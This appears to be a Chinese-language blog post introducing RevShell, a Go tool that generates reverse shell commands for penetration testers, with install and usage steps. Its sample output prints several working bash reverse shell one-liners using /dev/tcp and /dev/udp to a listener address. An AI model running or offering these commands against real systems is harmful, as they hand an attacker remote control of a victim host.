# 020-RevShell：一款好用的生成反弹Shell命令的工具




## RevShell



## 工具简介
RevShell是一个基于Go语言的反弹Shell命令生成工具，旨在帮助安全研究人员和渗透测试人员在需要与目标主机建立反向连接时快速生成相应的Shell代码。

目前支持的类型:
bash、sh、nc、ruby、php、python、rcat、perl、socat、node、telnet、zsh、lua、golang、vlang、awk、crystal。

除了支持多种Shell类型外，revshell还可以运行在多个操作系统平台上，包括Mac、Linux和Windows。这使得用户可以在不同的环境中使用revshell来生成适用于目标主机操作系统的反弹Shell代码，提高了工具的灵活性和适用性。

项目地址：https://github.com/BetterDefender/revshell

## 安装方式

- 自行编译运行

```shell
$ go build revshell.go
```

- 直接下载项目Releases中编译好的工具

https://github.com/BetterDefender/revshell/releases

![image-20230814142045336](/resource/RevShell.assets/image-20230814142045336.png)

## 使用方法

```shell
$ ./revshell [IPADDR] [PORT] [LANGUAGE]
```

## 使用示例

```shell
$ ./revshell 192.168.1.1 2222 bash
```

### MacOS

```shell
$ ./revshell 192.168.1.1 2222 bash
 _____               _____ _          _ _    _____  
|  __ \             / ____| |        | | |  / ____|
| |__) |_____   __ | (___ | |__   ___| | | | |  __  ___ _ __ 
|  _  // _ \ \ / /  \___ \| &#39;_ \ / _ \ | | | | |_ |/ _ \ &#39;_ \
| | \ \  __/\ V /   ____) | | | |  __/ | | | |__| |  __/ | | |
|_|  \_\___| \_/   |_____/|_| |_|\___|_|_|  \_____|\___|_| |_|

                       | 💻 Author: Gh0stX | 🍎 Version: 1.0 |

------------------------------------------
Bash -i:
bash -i &gt;&amp; /dev/tcp/192.168.1.1/2222 0&gt;&amp;1
/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.1/2222 0&gt;&amp;1
------------------------------------------
Bash 196:
0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.1/2222; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.1/2222; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
------------------------------------------
Bash read line:
exec 5&lt;&gt;/dev/tcp/192.168.1.1/2222;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
------------------------------------------
Bash 5:
bash -i 5&lt;&gt; /dev/tcp/192.168.1.1/2222 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5
/bin/bash -i 5&lt;&gt; /dev/tcp/192.168.1.1/2222 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5
------------------------------------------
Bash UDP:
bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
/bin/bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
```

![image](/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png)

### Windows

![image](/resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png)

### Linux

![image](/resource/RevShell.assets/259210130-e29555ee-16eb-4a03-96dc-999341d174f3.png)

## 总结

使用RevShell，您可以轻松生成所需的反弹Shell代码，从而在渗透测试、漏洞利用或安全评估等任务中更加高效地与目标主机进行交互和控制。

————————————————

版权声明：本文为CSDN博主「Gh0stX」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_42575797/article/details/132188010


---

> 作者: Gh0stX  
> URL: http://localhost:1313/posts/revshell/  

